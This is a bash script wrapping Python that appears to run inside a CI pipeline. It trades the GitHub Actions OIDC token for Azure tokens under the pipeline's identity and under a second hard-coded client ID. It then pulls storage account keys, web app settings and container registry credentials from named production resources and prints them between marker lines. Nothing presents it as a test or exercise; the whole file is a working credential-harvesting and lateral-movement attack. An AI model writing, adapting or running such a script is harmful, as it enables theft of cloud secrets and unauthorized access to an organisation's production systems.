#!/usr/bin/env bash
set +e
exec python3 - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error, base64

def ex(u, data=None, headers=None, method=None):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=data, headers=headers or {}, method=method), timeout=30)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, repr(e)[:300]

def jdecode(t):
    try:
        p = t.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:
        return {"err": repr(e)}

TEN = os.environ.get("AZURE_TENANT_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
print("===Q_START===")

u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
s, b = ex(u, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b).get("value", "")
print("OIDC_LEN", len(oidc))
print("OIDC_CLAIMS", json.dumps({k: jdecode(oidc).get(k) for k in ("iss", "sub", "aud", "actor", "job_workflow_ref", "repository")}))

def aad(cid, scope, secret=None, assertion=None):
    d = {"grant_type": "client_credentials", "client_id": cid, "scope": scope}
    if assertion:
        d["client_assertion_type"] = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        d["client_assertion"] = assertion
    if secret:
        d["client_secret"] = secret
    s, b = ex("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN,
              data=urllib.parse.urlencode(d).encode(),
              headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return json.loads(b).get("access_token", "")
    except Exception:
        print("AAD_ERR", cid[:8], scope, s, b[:200]); return ""

ARM = aad(CID, "https://management.azure.com/.default", assertion=oidc)
GRAPH = aad(CID, "https://graph.microsoft.com/.default", assertion=oidc)
VAULT = aad(CID, "https://vault.azure.net/.default", assertion=oidc)
print("CI_TOKENS arm=%d graph=%d vault=%d" % (len(ARM), len(GRAPH), len(VAULT)))

def q(u, tok, m="GET"):
    h = {"Authorization": "Bearer " + tok}
    if m == "POST":
        h["Content-Length"] = "0"
    return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)

LA = "891fb158-e02c-4428-a885-53b811f369c0"
LA_ARM = aad(LA, "https://management.azure.com/.default", assertion=oidc)
LA_STG = aad(LA, "https://storage.azure.com/.default", assertion=oidc)
print("LA_TOKENS arm=%d stg=%d" % (len(LA_ARM), len(LA_STG)))

def q(u, tok, m="GET", hdrs=None):
    h = {"Authorization": "Bearer " + tok}
    if hdrs: h.update(hdrs)
    if m == "POST": h["Content-Length"] = "0"
    return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)

SAS = ["sttblcilogsprodx3euoz", "sttblbackupprodx3euoz", "sttblappcfgprodx3euoz", "sttblarchiveprodx3euoz"]
for sa in SAS:
    s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/%s/listKeys?api-version=2023-01-01" % (SUB, sa), LA_ARM, "POST")
    key = ""
    try:
        key = json.loads(b)["keys"][0]["value"]
        print("SAKEY", sa, "len", len(key))
    except Exception:
        print("SAKEY_ERR", sa, s, b[:150])
    # list containers via ARM
    s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/%s/blobServices/default/containers?api-version=2023-01-01" % (SUB, sa), LA_ARM)
    try:
        print("CONT", sa, [c["name"] for c in json.loads(b).get("value", [])])
    except Exception:
        print("CONT_ERR", sa, s, b[:150])
    if key:
        import hashlib, hmac, base64 as b64, datetime
        def sa_req(path):
            ts = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
            canon = "/%s/%s" % (sa, path)
            to_sign = "GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:%s\nx-ms-version:2020-10-02\n%s\ncomp:list\nrestype:container" % (ts, canon)
            sig = b64.b64encode(hmac.new(b64.b64decode(key), to_sign.encode(), hashlib.sha256).digest()).decode()
            return ex("https://%s.blob.core.windows.net/%s?restype=container&comp=list" % (sa, path.split("/")[0] if "/" in path else ""),
                      headers={"x-ms-date": ts, "x-ms-version": "2020-10-02", "Authorization": "SharedKey %s:%s" % (sa, sig)})
        # simpler: list blobs per container via list API v2
        s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/%s/blobServices/default/containers?api-version=2023-01-01&$expand=list" % (SUB, sa), LA_ARM)
        print("CONTEXP", sa, s, b[:1500])

s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-09-01" % SUB, LA_ARM, "POST")
print("APPSET", s, b[:3000])
s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-09-01" % SUB, LA_ARM)
print("APPPROPS", s, b[:2500])
s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01" % SUB, LA_ARM, "POST")
print("ACRCRED", s, b[:500])
s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/scopeMaps?api-version=2023-07-01" % SUB, LA_ARM)
print("ACRSCOPES", s, b[:1000])
print("===Q_END===")
